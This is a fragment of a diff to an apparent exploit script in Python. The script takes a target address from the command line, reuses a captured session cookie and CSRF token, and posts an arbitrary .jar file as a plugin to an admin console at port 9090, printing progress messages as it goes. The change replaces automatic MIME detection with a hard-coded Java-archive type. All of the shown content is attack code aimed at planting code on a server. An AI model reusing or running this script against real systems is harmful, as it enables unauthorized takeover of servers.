@@ -2,7 +2,6 @@
 
 import requests
 import sys
-import magic
 import pathlib
 
 if len(sys.argv) <= 3:
@@ -39,9 +38,8 @@ csrf3 = cook['csrf']
 #upload jar file
 print('[-] Uploading plugin file')
 jar_url = f'http://{sys.argv[2]}:9090/plugin-admin.jsp?uploadplugin&csrf={csrf3}'
-mime = magic.Magic(mime=True)
-file_extension = pathlib.Path(f'{sys.argv[3]}').suffix
-jar_file = {('filename', (f'doesntmatter{file_extension}', open(f'{sys.argv[3]}','rb'), mime.from_file(f'{sys.argv[3]}')))}
+
+jar_file = {('filename', ('doesntmatter.jar', open(f'{sys.argv[3]}','rb'), 'application/java-archive'))}
 t = requests.post(jar_url, files=jar_file, headers={"Cookie":f"JSESSIONID={jsessionid2}; csrf={csrf3}"})
 print('[+] Uploaded Plugin')
 
